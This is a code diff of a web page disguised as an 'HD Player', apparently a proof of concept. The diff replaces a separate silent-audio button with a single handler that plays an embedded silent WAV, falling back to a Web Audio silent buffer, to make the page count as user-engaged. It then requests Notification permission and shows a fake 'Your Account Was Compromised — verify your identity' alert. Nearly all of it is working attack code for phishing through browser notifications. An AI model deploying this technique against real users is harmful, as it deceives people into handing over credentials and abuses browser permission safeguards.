@@ -21,36 +21,58 @@
 <body>
 <div class="player">
   <h2>HD Player — Now Playing</h2>
-  <!-- Silent 1-second audio primes user activation so the
-       Notification permission prompt can be displayed -->
-  <audio id="silent" src="silent-1s.mp3" preload="auto"></audio>
+  <!-- Silent audio embedded as base64 WAV (1s, no external file).
+       Playing it within the user gesture primes the origin as
+       user-engaged so the Notification prompt is allowed. -->
+  <audio id="silent" preload="auto"
+    src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQAAAAA="></audio>
 
-  <button id="playBtn">Play Episode</button>
   <button class="secondary" onclick="askNotif()">Enable Notifications</button>
   <pre id="log">Status: idle</pre>
 </div>
 
 <script>
 const log = document.getElementById('log');
+const ts = () => new Date().toISOString().slice(11, 23);
 
-document.getElementById('playBtn').addEventListener('click', () => {
+function setLog(msg) {
+  log.textContent = `[${ts()}] ${msg}`;
+}
+
+// Silent 1s WAV fallback generator via Web Audio API
+// (works even if the data URI is blocked by CSP)
+function playSilent() {
   const au = document.getElementById('silent');
-  au.play().then(() => {
-    log.textContent = 'Status: silent audio started. Origin is now ' +
-      'treated as user-engaged; permission prompt can be triggered.';
-  }).catch(e => { log.textContent = 'Status: autoplay blocked — ' + e.message; });
-});
+  const viaAudio = au.play().then(() => 'embedded silent WAV');
+  const viaWebAudio = new Promise((resolve) => {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const buf = ctx.createBuffer(1, ctx.sampleRate, ctx.sampleRate);
+    const src = ctx.createBufferSource();
+    src.buffer = buf;               // zero-filled = silence
+    src.connect(ctx.destination);
+    src.start(0);
+    src.onended = () => { ctx.close(); resolve('WebAudio silent buffer'); };
+  });
+  return viaAudio.catch(() => viaWebAudio);
+}
 
 function askNotif() {
-  Notification.requestPermission().then(p => {
-    log.textContent = 'Status: permission = ' + p;
+  setLog('Playing silent audio to prime user activation...');
+  playSilent().then(how => {
+    setLog(`Silent audio started (${how}). Origin is now treated as ` +
+           'user-engaged; requesting Notification permission.');
+    return Notification.requestPermission();
+  }).then(p => {
+    setLog('Permission = ' + p);
     if (p === 'granted') {
       new Notification('Security Alert: Your Account Was Compromised', {
         body: 'Click to verify your identity now.',
         icon: '/icon.png'
       });
+      setLog('Permission granted — simulated social-engineering ' +
+             'notification displayed. PoC complete.');
     }
-  });
+  }).catch(e => setLog('Error: ' + e.name + ' — ' + e.message));
 }
 </script>
 </body>
